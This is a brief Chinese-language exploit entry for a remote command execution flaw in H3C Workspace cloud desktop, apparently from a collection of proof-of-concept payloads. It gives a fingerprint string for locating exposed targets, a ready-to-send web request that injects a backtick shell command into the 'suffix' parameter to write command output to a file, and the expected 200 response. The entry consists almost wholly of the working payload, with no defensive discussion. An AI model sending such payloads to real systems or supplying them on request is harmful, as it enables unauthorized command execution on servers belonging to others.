# H3CWorkspace云桌面远程命令执行漏洞

H3CWorkspace ｜ 命令执行 ｜ —
- **指纹**：`"H3C Workspace"`

**Payload**
```
/webui/?g=aaa_portal_auth_adv_submit&tab_name=广告模板&welcome_word=广告模板&btn_color=337ab7&suffix=%7Burlenc(%60id+%3E/usr/local/webui/test.txt%60)%7D&bkg_flag=0&check_btn_color=&des=undefined
```
- **响应特征**：200